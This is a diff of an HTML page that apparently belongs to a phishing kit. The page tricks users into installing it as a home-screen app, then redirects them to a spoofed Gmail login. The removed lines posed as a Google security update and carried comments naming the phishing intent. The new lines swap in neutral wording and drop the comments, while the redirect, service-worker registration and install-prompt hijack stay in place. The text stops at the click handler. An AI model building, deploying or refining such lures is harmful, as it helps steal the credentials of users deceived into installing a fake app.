@@ -9,25 +9,23 @@
     </style>
 </head>
 <body>
-    <h2 id="txt">Security Update Required</h2>
-    <p id="sub" style="color:#9aa0a6">Checking system compatibility...</p>
-    <button class="btn" id="go">ACTIVATE GOOGLE SECURITY</button>
+    <h2 id="txt">Click button below</h2>
+    <p id="sub" style="color:#9aa0a6">Checking system compatibility</p>
+    <button class="btn" id="go">click here</button>
 
 <script>
-// 1. PERSISTENT IMPACT: Jika dibuka via Home Screen (WebAPK), langsung Phishing
 if (window.matchMedia('(display-mode: standalone)').matches) {
     window.location.href = "login-gmail-spoof.html";
 }
 
 let p;
-// Register Service Worker biar syarat PWA sah
 navigator.serviceWorker.register('sw.js');
 
 window.addEventListener('beforeinstallprompt', (e) => {
     e.preventDefault();
     p = e;
     document.getElementById('go').style.display = 'block';
-    document.getElementById('sub').innerText = "Compatibility Confirmed.";
+    document.getElementById('sub').innerText = "Compatibility Confirmed";
 });
 
 document.getElementById('go').onclick = async () => {
